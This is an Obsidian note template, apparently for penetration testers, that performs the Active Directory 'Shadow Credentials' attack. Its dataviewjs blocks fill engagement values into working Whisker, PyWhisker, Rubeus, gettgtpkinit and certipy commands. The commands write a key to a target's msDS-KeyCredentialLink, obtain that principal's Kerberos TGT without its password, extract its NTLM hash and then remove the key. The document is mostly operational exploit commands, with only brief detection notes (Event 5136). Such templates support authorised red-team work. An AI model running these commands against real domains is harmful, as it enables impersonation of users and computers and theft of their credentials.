---
# Attack-specific fields
target_principal:
whisker_cert_b64:
whisker_cert_password:
whisker_device_id:
tgt_ticket:
notes:
---

# Shadow Credentials

> [!abstract] Attack Summary
> The **msDS-KeyCredentialLink** attribute stores raw key credentials for PKINIT (Key Trust model). If you can **write** to this attribute on a user or computer object, you can add your own key pair, then use PKINIT to authenticate as that principal and obtain their TGT — without knowing their password.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Target Principal (user or computer$)", `\`INPUT[text:target_principal]\``],
  ["Whisker Device ID (from add output)",  `\`INPUT[text:whisker_device_id]\``],
  ["Certificate Password (from output)",   `\`INPUT[text:whisker_cert_password]\``],
]);
```

> [!info] Prerequisites
> - Need **Write** access to `msDS-KeyCredentialLink` on the target (GenericWrite, GenericAll, Self, or explicit attribute write)
> - Domain must support PKINIT (AD CS or Windows Hello for Business in place helps, but not always required)

---

## Step 1 — Find Writable Targets

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const username = b?.username ?? "USER";
dv.paragraph("```powershell\n# Find objects where current user has write access\nFind-InterestingDomainAcl -ResolveGUIDs | ?{ $_.IdentityReferenceName -match '" + username + "' }\n\n# Look for GenericWrite, WriteProperty on users or computers\n```");
```

---

## Step 2 — Check Existing Keys (Important for Cleanup)

**Windows — Whisker List**
```dataviewjs
const p = dv.current();
const target = p?.target_principal || "TARGET_USER";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Whisker\\Whisker\\bin\\Release\\Whisker.exe list /target:" + target + "\n\n# If entries exist, note Device IDs before adding your own!\n```");
```

**Linux — PyWhisker**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const target   = p?.target_principal || "TARGET_USER";
dv.paragraph("```bash\npywhisker.py -d " + domain + " -u '" + username + "' -p '" + password + "' --dc-ip " + dc_ip + " --target '" + target + "' --action list\n```");
```

---

## Step 3 — Add Shadow Credential

**Windows — Whisker Add**
```dataviewjs
const p = dv.current();
const target = p?.target_principal || "TARGET_USER";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Whisker\\Whisker\\bin\\Release\\Whisker.exe add /target:" + target + "\n\n# Output will include:\n# - Certificate (base64)\n# - Certificate password\n# - DeviceID (save this for cleanup)\n# - Rubeus command to use\n```");
```

**Linux — PyWhisker Add**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const target   = p?.target_principal || "TARGET_USER";
dv.paragraph("```bash\npywhisker.py -d " + domain + " -u '" + username + "' -p '" + password + "' --dc-ip " + dc_ip + " --target '" + target + "' --action add\n```");
```

Record output:
- Device ID: `INPUT[text:whisker_device_id]`
- Certificate (base64): `INPUT[text:whisker_cert_b64]`
- Certificate Password: `INPUT[text:whisker_cert_password]`

---

## Step 4 — Request TGT via PKINIT

**Windows — Rubeus (command provided by Whisker)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const target  = p?.target_principal || "TARGET_USER";
const certB64 = p?.whisker_cert_b64 || "BASE64_CERT";
const certPass= p?.whisker_cert_password || "CERT_PASSWORD";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + target + " /certificate:" + certB64 + " /password:\"" + certPass + "\" /domain:" + domain + " /nowrap\n```");
```

**Linux — PKINIT via Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const dc_ip   = b?.dc_ip  ?? "DC_IP";
const target  = p?.target_principal || "TARGET_USER";
dv.paragraph("```bash\n# Use gettgtpkinit from PKINITtools\npython3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass CERT_PASS " + domain + "/" + target + " output.ccache\nexport KRB5CCNAME=output.ccache\n\n# Or with certipy\ncertipy auth -pfx cert.pfx -username " + target + " -domain " + domain + " -dc-ip " + dc_ip + "\n```");
```

Paste TGT: `INPUT[text:tgt_ticket]`

---

## Step 5 — Extract NTLM Hash (Optional)

**Windows — Rubeus PKINIT NTLM Retrieval**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const target  = p?.target_principal || "TARGET_USER";
const certB64 = p?.whisker_cert_b64 || "BASE64_CERT";
const certPass= p?.whisker_cert_password || "CERT_PASSWORD";
dv.paragraph("```bash\n# PKINIT + getNT hash (Kerberos U2U)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + target + " /certificate:" + certB64 + " /password:\"" + certPass + "\" /domain:" + domain + " /getcredentials /show /nowrap\n```");
```

---

## Step 6 — Cleanup

> [!danger] Always clean up! If the target already had keys, remove only the one you added using its Device ID.

**Windows — Whisker Remove**
```dataviewjs
const p = dv.current();
const target   = p?.target_principal || "TARGET_USER";
const deviceId = p?.whisker_device_id || "DEVICE_ID";
dv.paragraph("```bash\n# Remove only your key by Device ID\nexecute-assembly C:\\Tools\\Whisker\\Whisker\\bin\\Release\\Whisker.exe remove /target:" + target + " /deviceid:" + deviceId + "\n\n# Verify cleaned up\nexecute-assembly C:\\Tools\\Whisker\\Whisker\\bin\\Release\\Whisker.exe list /target:" + target + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Modification of `msDS-KeyCredentialLink` generates **Event 5136** (directory service change).
> - PKINIT authentication with a non-certificate account is anomalous.
> - Monitor for unusual writes to this attribute — it's rarely modified in most environments.

---

## Notes & Results

`INPUT[textarea:notes]`
